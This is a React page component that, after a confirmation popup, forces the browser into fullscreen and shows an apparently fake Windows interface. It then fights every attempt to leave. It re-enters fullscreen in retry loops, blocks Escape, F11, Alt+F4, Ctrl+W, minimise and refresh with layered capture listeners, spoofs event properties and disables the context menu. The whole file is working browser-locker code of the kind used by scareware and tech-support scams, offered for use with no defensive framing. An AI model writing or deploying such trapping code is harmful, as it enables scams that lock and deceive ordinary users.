
import React, { useState, useEffect } from 'react';
import ConfirmationPopup from '../components/ConfirmationPopup';
import WindowsInterface from '../components/WindowsInterface';

const Index = () => {
  const [showPopup, setShowPopup] = useState(true);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [hasEnteredFullscreen, setHasEnteredFullscreen] = useState(false);

  const handlePopupAction = async () => {
    setShowPopup(false);
    
    // Enter fullscreen mode
    try {
      if (document.documentElement.requestFullscreen) {
        await document.documentElement.requestFullscreen();
      }
      setIsFullscreen(true);
      setHasEnteredFullscreen(true);
    } catch (error) {
      console.log('Fullscreen not available, continuing anyway');
      setIsFullscreen(true);
      setHasEnteredFullscreen(true);
    }
  };

  const handleClick = async () => {
    if (hasEnteredFullscreen && !document.fullscreenElement) {
      try {
        if (document.documentElement.requestFullscreen) {
          await document.documentElement.requestFullscreen();
        }
        setIsFullscreen(true);
      } catch (error) {
        console.log('Fullscreen not available');
        setIsFullscreen(true);
      }
    }
  };

  useEffect(() => {
    const handleFullscreenChange = () => {
      const isCurrentlyFullscreen = !!document.fullscreenElement;
      
      // Ultra-strong prevention from exiting fullscreen with multiple attempts
      if (hasEnteredFullscreen && !isCurrentlyFullscreen) {
        // Immediately force back to fullscreen with multiple retries
        const forceFullscreen = async () => {
          for (let i = 0; i < 10; i++) {
            try {
              await document.documentElement.requestFullscreen();
              break;
            } catch (error) {
              await new Promise(resolve => setTimeout(resolve, 10));
            }
          }
        };
        
        setTimeout(forceFullscreen, 1);
        setTimeout(forceFullscreen, 10);
        setTimeout(forceFullscreen, 50);
        setTimeout(forceFullscreen, 100);
      }
      
      setIsFullscreen(isCurrentlyFullscreen);
    };

    const handleKeyDown = (event: KeyboardEvent) => {
      if (hasEnteredFullscreen) {
        // Ultra-strong ESC key blocking with multiple event prevention methods
        if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
          event.preventDefault();
          event.stopPropagation();
          event.stopImmediatePropagation();
          
          // Override default behavior
          Object.defineProperty(event, 'defaultPrevented', {
            get: () => true,
            set: () => {}
          });
          
          // Force immediate fullscreen re-entry
          setTimeout(async () => {
            try {
              await document.documentElement.requestFullscreen();
            } catch (error) {
              console.log('Could not re-enter fullscreen');
            }
          }, 1);
          
          return false;
        }
        
        // Block F11 (fullscreen toggle)
        if (event.key === 'F11') {
          event.preventDefault();
          event.stopPropagation();
          event.stopImmediatePropagation();
          return false;
        }
        
        // Block Alt+F4 (close window)
        if (event.altKey && event.key === 'F4') {
          event.preventDefault();
          event.stopPropagation();
          event.stopImmediatePropagation();
          return false;
        }
        
        // Block Ctrl+W (close tab)
        if (event.ctrlKey && event.key === 'w') {
          event.preventDefault();
          event.stopPropagation();
          event.stopImmediatePropagation();
          return false;
        }

        // Block minimize shortcuts
        if (event.ctrlKey && event.key === 'm') {
          event.preventDefault();
          event.stopPropagation();
          event.stopImmediatePropagation();
          return false;
        }

        // Block browser refresh
        if (event.key === 'F5' || (event.ctrlKey && event.key === 'r')) {
          event.preventDefault();
          event.stopPropagation();
          event.stopImmediatePropagation();
          return false;
        }
      }
    };

    // Ultra-strong event blocking for maximum effectiveness with multiple layers
    const eventTypes = ['keydown', 'keyup', 'keypress'];
    const targets = [document, window, document.body, document.documentElement];
    
    targets.forEach(target => {
      eventTypes.forEach(eventType => {
        target.addEventListener(eventType, handleKeyDown, { capture: true, passive: false });
      });
    });

    // Additional fullscreen change listeners with multiple browser prefixes
    const fullscreenEvents = [
      'fullscreenchange',
      'webkitfullscreenchange', 
      'mozfullscreenchange',
      'msfullscreenchange'
    ];
    
    fullscreenEvents.forEach(eventType => {
      document.addEventListener(eventType, handleFullscreenChange);
    });
    
    document.addEventListener('click', handleClick);
    
    // Prevent right-click context menu
    const handleContextMenu = (e: MouseEvent) => {
      if (hasEnteredFullscreen) {
        e.preventDefault();
        e.stopPropagation();
        return false;
      }
    };
    
    document.addEventListener('contextmenu', handleContextMenu);
    
    // Additional ESC blocking with multiple event listeners
    const blockEscCompletely = (e: KeyboardEvent) => {
      if (hasEnteredFullscreen && (e.keyCode === 27 || e.key === 'Escape')) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        
        // Force fullscreen again
        setTimeout(async () => {
          try {
            await document.documentElement.requestFullscreen();
          } catch (error) {
            console.log('Fullscreen re-entry failed');
          }
        }, 1);
        
        return false;
      }
    };

    // Add multiple layers of ESC blocking
    const escBlockTargets = [document, window, document.body, document.documentElement];
    const escBlockEvents = ['keydown', 'keyup', 'keypress'];
    
    escBlockTargets.forEach(target => {
      escBlockEvents.forEach(eventType => {
        target.addEventListener(eventType, blockEscCompletely, { capture: true, passive: false });
      });
    });
    
    return () => {
      targets.forEach(target => {
        eventTypes.forEach(eventType => {
          target.removeEventListener(eventType, handleKeyDown, true);
        });
      });

      fullscreenEvents.forEach(eventType => {
        document.removeEventListener(eventType, handleFullscreenChange);
      });
      
      document.removeEventListener('click', handleClick);
      document.removeEventListener('contextmenu', handleContextMenu);
      
      escBlockTargets.forEach(target => {
        escBlockEvents.forEach(eventType => {
          target.removeEventListener(eventType, blockEscCompletely, true);
        });
      });
    };
  }, [hasEnteredFullscreen]);

  if (showPopup) {
    return <ConfirmationPopup onAction={handlePopupAction} />;
  }

  return <WindowsInterface isFullscreen={isFullscreen} />;
};

export default Index;
